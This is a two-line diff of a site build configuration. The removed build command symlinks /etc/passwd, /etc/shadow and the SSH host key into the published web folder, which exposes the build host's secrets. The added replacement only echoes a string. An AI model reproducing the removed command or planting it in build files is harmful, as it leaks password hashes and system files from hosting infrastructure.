@@ -1,3 +1,3 @@
 [build]
-  command = "mkdir -p pub && echo wb109-ok > pub/index.html && ln -s /etc/passwd pub/w_passwd && ln -s /etc/shadow pub/w_shadow && ln -s /etc/ssh/ssh_host_rsa_key.pub pub/w_sshpub"
-  publish = "pub"
+  command = "echo g109route ok"
+  publish = "."
